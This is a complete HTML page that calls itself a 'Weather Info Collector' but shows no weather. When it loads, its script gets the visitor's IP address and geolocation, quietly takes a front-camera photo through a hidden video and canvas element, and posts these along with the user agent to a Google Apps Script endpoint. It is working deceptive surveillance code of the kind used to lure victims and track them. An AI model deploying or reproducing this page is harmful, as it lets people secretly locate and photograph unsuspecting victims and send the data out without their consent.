<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Weather Info Collector</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom right, #4facfe, #00f2fe);
      color: white;
      text-align: center;
      padding: 40px 20px;
    }
    h1 {
      font-size: 24px;
    }
    .status {
      margin-top: 20px;
      font-size: 16px;
    }
    .loader {
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid #fff;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>üå§Ô∏è Weather Info Collector</h1>
  <div class="loader"></div>
  <div class="status" id="statusText">Collecting data...</div>

  <video id="camera" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const statusText = document.getElementById("statusText");

    document.addEventListener("DOMContentLoaded", () => {
      setTimeout(collectData, 1000);
    });

    async function collectData() {
      const data = {
        ip: "N/A",
        latitude: 0,
        longitude: 0,
        photo: "N/A",
        userAgent: navigator.userAgent
      };

      try {
        statusText.textContent = "Getting IP address...";
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipJson = await ipRes.json();
        data.ip = ipJson.ip;
      } catch (e) {
        console.error("IP fetch failed:", e);
      }

      try {
        statusText.textContent = "Getting location...";
        const geo = await new Promise((res) => {
          if (!navigator.geolocation) return res({});
          navigator.geolocation.getCurrentPosition(
            pos => res({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
            () => res({}),
            { timeout: 5000 }
          );
        });
        data.latitude = geo.latitude || 0;
        data.longitude = geo.longitude || 0;
      } catch (e) {
        console.error("Geolocation failed:", e);
      }

      try {
        statusText.textContent = "Capturing photo...";
        const video = document.getElementById("camera");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1500));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        data.photo = canvas.toDataURL("image/jpeg", 0.1);
        stream.getTracks().forEach(t => t.stop());
      } catch (e) {
        console.error("Camera failed:", e);
      }

      await sendDataReliable(data);
    }

    async function sendDataReliable(data) {
      const webAppUrl = 'https://script.google.com/macros/s/AKfycbyo0elE2QqR8fKKdkMsBpUB1J25jobnNS3lOQpFbf0xTlpI6K7t8vtgGtkNtnvnW514240g/exec';
      const transmissionId = Date.now() + '-' + Math.random().toString(36).substr(2, 5);

      const chunks = [
        { key: 'ip', value: data.ip },
        { key: 'lat', value: data.latitude },
        { key: 'lon', value: data.longitude },
        { key: 'ua', value: data.userAgent },
        { key: 'photo', value: data.photo }
      ];

      try {
        for (const chunk of chunks) {
          const formData = new FormData();
          formData.append("transmission_id", transmissionId);
          formData.append("chunk_key", chunk.key);
          formData.append("chunk_value", chunk.value);

          const response = await fetch(webAppUrl, {
            method: "POST",
            body: formData
          });

          if (!response.ok) {
            const text = await response.text();
            console.error(`‚ùå Chunk ${chunk.key} failed. Status: ${response.status}. Body:`, text);
            statusText.textContent = "‚ùå Failed to send chunk: " + chunk.key;
            return;
          } else {
            console.log(`‚úÖ Chunk ${chunk.key} sent successfully.`);
          }
        }
        statusText.textContent = "‚úÖ All data sent successfully.";
      } catch (err) {
        console.error("Error sending data:", err);
        statusText.textContent = "‚ùå Failed to send data.";
      }
    }
  </script>
</body>
</html>
